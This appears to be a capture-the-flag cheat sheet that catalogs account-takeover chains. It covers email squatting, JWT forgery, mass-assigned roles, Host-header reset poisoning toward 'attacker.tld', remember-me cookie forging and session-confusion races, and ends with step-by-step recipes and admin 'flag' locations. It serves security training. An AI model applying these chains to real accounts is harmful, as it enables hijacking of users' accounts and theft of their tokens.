# Account takeover chains — the composite kills

ATO is rarely a single bug — it's a primitive + a carrier + a read. This
file catalogs the composed chains by entry point.

---

## 1. Email/identity entry

**Pre-takeover via duplicate email**: register `victim@t.tld` before the
victim, or with `victim+tag@t.tld` normalization tricks. Verify on
*your* account → the app treats you as the email owner.

**Unverified-account squat**: app lets you register an unverified
account *and use it* — no verify gate before login → squat on any email.

**Email change without verification**: `POST /settings/email` changes
the login identity; if the *old* email isn't notified or the *new* email
isn't verified → steal the account by pointing it at yourself.

**Mass-assign email**: `PUT /me {"email":"victim@t.tld"}` — the
unique-check is only on `username`.

## 2. Token-leak entry

- `?token=`/`?session=` in URL → `Referer` → log → readable log endpoint.
- `localStorage` token + XSS → steal.
- JWT with `alg=none`/`weak secret`/`kid`/`jku` → forge.
- Reset token leaked via `Host` injection or param pollution.
- Token in `Set-Cookie` on GET → `Referer` on external resources.
- Token in the `/login` response body — the response is cached.
- `remember_me` with leaked `SECRET` → recompute for victim.

## 3. Flow-bypass entry

- **Password reset**: token unbound → token-prediction →
  param-pollution → all in `password-reset.md`.
- **MFA skip**: pre-MFA session already authorized, or code absent/
  falsy/race (`mfa-bypass.md`).
- **OAuth**: `redirect_uri` bypass → code/token theft; `state` missing →
  login CSRF; `id_token` unsigned/aud-mismatch → forge
  (`oauth-flow-issues.md`).
- **Impersonation**: `?su=`/`?switch_user=`/`?as=`/`?become=` — an
  admin-panel feature reachable without the admin role.

## 4. The composed chain table

| Entry | Carrier | Sink |
|---|---|---|
| `__proto__.role` in update body | mass-assign | admin API |
| `Host: attacker` on `/forgot` | reset link | victim's password |
| `alg=none` JWT | `Authorization` header | `/admin` endpoint |
| `kid=/dev/null` + empty secret | `Authorization` header | `/admin` endpoint |
| sequential `JSESSIONID` | `Cookie` header | victim's session |
| `session=md5(user)` | `Cookie` header | `api/me` |
| `Domain=.corp.com` cookie | subdomain plant | parent session |
| `state` missing OAuth | `Location` redirect | login CSRF |
| `redirect_uri` bypass | `Location` redirect | token theft |
| `_switch_user=admin` | query param | admin session |
| registration race | `Set-Cookie` response | account confusion |
| `email` array pollution | SMTP header | reset link to attacker |
| `referer` token leak | CDN/analytics | token replay |
| unbound reset token | `POST /reset` body | password change |
| `remember_me` forge | `Cookie` header | persistent login |
| pre-MFA session | `Cookie` header | post-MFA surface |
| localStorage JWT | XSS | token theft |
| `aud`/`iss` unchecked | cross-service JWT | confused deputy |
| `sub` coercion | claim type | another user |
| `jti` replay | revoked token | post-logout access |
| `?_switch_user=`/`?su=` | URL param | impersonation |
| `id_token` unsigned | `id_token` claim | forged identity |
| `code` replay via wrong client | `/token` exchange | another user's session |

## 5. The flag locations post-ATO

Once you have the victim/admin session:

- `GET /admin` `/admin/flag` `/admin/config` `/admin/users` `/admin/notes`
- `GET /api/me` → the admin's profile fields (flags in `bio`, `note`,
  `internal_comment`)
- `GET /admin/files` `/admin/backups` `/admin/db` — a file-read surface
- `POST /admin/impersonate` → deeper access
- `GET /admin/logs` → previous sessions, other flags
- A second auth boundary the admin can cross (`/internal/`, `/api/v2/`)

## 6. Multi-step ATO recipes

**Recipe A — host-header → reset → login**

```
POST /forgot {email:victim} + Host: attacker.tld
  → victim gets https://attacker.tld/reset?token=T
  → victim clicks → you read T from access log
  → POST /reset {token:T, password:chosen}
  → login as victim
```

**Recipe B — mass-assign → role → admin API**

```
POST /register {u,p,role:"admin"}          → maybe rejected
POST /profile {role:"admin"}               → accepted (no whitelist)
GET /api/me                                 → {"role":"admin"} — verified
GET /admin                                  → flag
```

**Recipe C — cookie-swap → session-confusion → flag**

```
Race 2 registrations on same canonical email
  → both pass uniqueness
  → response A sets session_A, response B renders for the OTHER account
  → swap cookies → your browser is logged in but identity is victim's
```

**Recipe D — JWT confusion → admin claim → flag**

```
login → token (RS256)
fetch /jwks.json → PEM
jwt_forge --pubkey pubkey.pem --claims '{"role":"admin"}'
replay → /admin → flag
```

**Recipe E — remember-me → any user**

```
.env leaks SECRET
remember_me = user:md5(user:SECRET)
recompute for "admin" → Cookie → admin session
```

## 7. When the ATO needs the *victim* to act

Some chains need the victim — a bot or a real user — to do a thing:

- **CSRF on a state-changing GET/POST** (`web-csrf`): you craft the URL,
  the bot clicks, the session is the victim's.
- **Login CSRF** (`oauth-flow-issues.md §3`): you drop *your* `code` in
  their callback — they're logged in as you, their actions land in your
  account.
- **Subdomain cookie plant**: they browse `xss.corp.com`, your planted
  `Domain=.corp.com` cookie shadows the real one — next request to
  `corp.com` is authenticated *as you*.

For a bot: submit the URL at `/report`/`/visit`, capture what your
server logs — cookie, referrer, `localStorage` if readable.
